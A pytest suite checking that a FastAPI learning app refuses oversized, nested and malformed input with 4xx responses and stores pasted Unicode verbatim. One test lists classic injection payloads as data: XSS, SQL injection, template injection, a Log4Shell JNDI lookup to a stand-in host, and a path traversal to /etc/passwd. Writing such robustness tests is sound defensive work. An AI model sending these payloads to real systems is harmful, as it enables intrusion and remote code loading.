"""P7-T3 — oversized and hostile payloads are refused CLEANLY, never by crashing.

THE DIFFERENCE BETWEEN REFUSED AND CRASHED
------------------------------------------
Both stop the request. Only one of them is safe.

A refusal is a 4xx: the server understood, said no, and is ready for the next
request. A crash is a 5xx, an unhandled exception, or a worker that dies holding
its connection -- and the caller cannot tell whether their write landed. Under
load, the second turns one bad request into an outage, because every retry
repeats it.

So every case here asserts a 4xx specifically. `status_code != 200` would be
satisfied by a 500, which is the failure being tested for.

WHAT IS DELIBERATELY NOT CLAIMED
--------------------------------
There is no body-size limit in this application. Starlette does not impose one
and neither does the app, so a genuinely enormous upload is bounded only by
whatever proxy sits in front in a deployment. That is recorded in
`test_a_large_body_is_handled_without_a_5xx` rather than hidden: the test proves
a megabyte-scale body is answered rather than crashing, and says plainly that it
does not prove a limit exists.
"""

from __future__ import annotations

import json
from collections.abc import Iterator
from typing import Any

import pytest
from fastapi.testclient import TestClient

from learning_os.domain.python_recursion import GRAPH
from learning_os.http.app import build_app
from learning_os.http.repository import InMemoryLearners

KNOWN_SKILL = "python.recursion.identify_base_case"


@pytest.fixture()
def client() -> Iterator[TestClient]:
    with TestClient(build_app(graph=GRAPH, learners=InMemoryLearners())) as started:
        yield started


def _learner(client: TestClient) -> str:
    return str(client.post("/learners", json={"cohort": "y11"}).json()["learner_id"])


# ---------------------------------------------------------------------------
# Oversized values in fields that declare a maximum
# ---------------------------------------------------------------------------


def test_a_cohort_far_over_its_maximum_is_refused(client: TestClient) -> None:
    response = client.post("/learners", json={"cohort": "y" * 10_000})
    assert response.status_code == 422, response.status_code


def test_a_cohort_exactly_at_its_maximum_is_accepted(client: TestClient) -> None:
    """The PAIR and the BOUNDARY.

    64 is the declared maximum. A check written with `>` instead of `>=`
    refuses this, and the failure would look like an arbitrary server rule
    rather than an off-by-one.
    """
    response = client.post("/learners", json={"cohort": "y" * 64})
    assert response.status_code == 201, response.text


def test_a_cohort_one_over_its_maximum_is_refused(client: TestClient) -> None:
    """The other side of the same boundary."""
    assert client.post("/learners", json={"cohort": "y" * 65}).status_code == 422


def test_a_question_far_over_its_maximum_is_refused(client: TestClient) -> None:
    response = client.post(
        "/lessons", json={"skill_id": KNOWN_SKILL, "question": "why? " * 50_000}
    )
    assert response.status_code == 422


def test_a_single_enormous_word_is_refused_not_truncated(client: TestClient) -> None:
    """One 5,000-character token with no spaces.

    A length check written against word count rather than characters lets this
    through, and it is the shape that reaches a renderer and blows a layout.
    """
    response = client.post(
        "/lessons", json={"skill_id": KNOWN_SKILL, "question": "a" * 5_000}
    )
    assert response.status_code == 422


def test_an_oversized_idempotency_key_is_refused(client: TestClient) -> None:
    """Headers are input too, and this one is used as a dictionary key.

    An unbounded key is unbounded memory: a caller sending a megabyte header per
    request stores a megabyte per request, for as long as the learner exists.
    """
    learner_id = _learner(client)
    response = client.post(
        f"/learners/{learner_id}/attempts",
        json={
            "skill_id": KNOWN_SKILL,
            "correct": True,
            "representation": "code",
            "context_novelty": 0.5,
        },
        headers={"Idempotency-Key": "k" * 5_000},
    )
    assert response.status_code == 422


# ---------------------------------------------------------------------------
# Structurally hostile bodies
# ---------------------------------------------------------------------------


def test_a_deeply_nested_body_does_not_crash_the_server(client: TestClient) -> None:
    """Deep nesting is the classic parser denial-of-service.

    A recursive-descent parser without a depth limit hits Python's recursion
    ceiling, and a `RecursionError` escaping a request handler is a 500. The
    assertion is on the CLASS of response: any 4xx is a refusal, a 5xx is the
    bug.
    """
    body = json.loads("[" * 200 + "]" * 200)
    response = client.post("/learners", json=body)
    assert 400 <= response.status_code < 500, response.status_code


def test_a_body_with_very_many_keys_is_refused(client: TestClient) -> None:
    """Ten thousand unknown fields. `extra="forbid"` must refuse, not enumerate
    them into an unbounded error document."""
    body: dict[str, Any] = {f"field_{index}": index for index in range(10_000)}
    body["cohort"] = "y11"
    response = client.post("/learners", json=body)
    assert 400 <= response.status_code < 500, response.status_code


def test_a_large_body_is_handled_without_a_5xx(client: TestClient) -> None:
    """A megabyte-scale body must be ANSWERED, not crash the worker.

    STATED PLAINLY: this does not prove a size limit exists. There is none --
    neither Starlette nor this application imposes one, so in a deployment the
    only bound is whatever proxy sits in front. What this proves is narrower and
    still worth having: a body of this size produces a normal refusal rather
    than an unhandled exception.
    """
    response = client.post("/learners", json={"cohort": "y" * 1_000_000})
    assert response.status_code < 500, response.status_code


def test_control_bytes_in_the_body_are_refused_cleanly(client: TestClient) -> None:
    response = client.post(
        "/learners",
        content=b"\x00\x01\x02\xff\xfe",
        headers={"Content-Type": "application/json"},
    )
    assert 400 <= response.status_code < 500, response.status_code


# ---------------------------------------------------------------------------
# Text that real people actually paste
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "question",
    [
        "Why does recursion need a base case​?",  # zero-width space
        "Why does “recursion” need a base case?",  # smart quotes from a PDF
        "لماذا تحتاج العودية إلى حالة أساسية؟",  # right-to-left
        "재귀에는 왜 기본 사례가 필요한가요?",  # Korean
        # Written as an ESCAPE, not as the literal character. The point of
        # this case is a Cyrillic letter that is visually identical to a
        # Latin one, so a reader of this file cannot see which it is -- and
        # ruff flags the literal as ambiguous, correctly. The escape keeps
        # the test and makes the intent legible in the same line.
        "Why does r\u0435cursion need a base case?",
        "Why does recursion need a base case? 🤔",  # emoji
    ],
)
def test_realistic_unicode_is_accepted_not_mangled(
    client: TestClient, question: str
) -> None:
    """These are not adversarial, they are Tuesday.

    Pasted from a PDF, typed on a phone, written in another script. Each has
    broken a naive validator somewhere. Accepted is the right answer, and the
    question must come back EXACTLY as sent -- silently sanitised is a finding,
    not a pass.
    """
    response = client.post("/lessons", json={"skill_id": KNOWN_SKILL, "question": question})
    assert response.status_code == 201, response.text
    assert response.json()["question"] == question


@pytest.mark.parametrize(
    "question",
    [
        "<script>alert(1)</script>",
        "' OR 1=1--",
        "{{7*7}}",
        "${jndi:ldap://example.test/a}",
        "../../../../etc/passwd",
    ],
)
def test_injection_shaped_text_is_stored_verbatim_and_never_executed(
    client: TestClient, question: str
) -> None:
    """The API's job is to carry text, not to interpret it.

    Escaping here would be the wrong layer and would corrupt legitimate content:
    a computing lesson has every right to ask about `<script>` or `' OR 1=1--`.
    The rule is that it round-trips unchanged, and that whatever renders it
    escapes at the point of rendering.

    Silently sanitised and silently corrupted are BOTH findings, which is why
    this asserts equality rather than merely a 201.
    """
    response = client.post("/lessons", json={"skill_id": KNOWN_SKILL, "question": question})
    assert response.status_code == 201, response.text
    assert response.json()["question"] == question


def test_a_null_byte_inside_a_string_is_refused_or_preserved_never_truncated(
    client: TestClient,
) -> None:
    """The one case where "accepted" would be wrong.

    PostgreSQL cannot store a NUL inside a text value, so a string containing
    one is either refused now or corrupted later. What must not happen is silent
    truncation at the NUL, which turns a long question into a short one and
    loses the rest without telling anybody.
    """
    question = "Why does recursion\x00 need a base case?"
    response = client.post("/lessons", json={"skill_id": KNOWN_SKILL, "question": question})

    if response.status_code == 201:
        assert response.json()["question"] == question, "the question was truncated"
    else:
        assert 400 <= response.status_code < 500, response.status_code
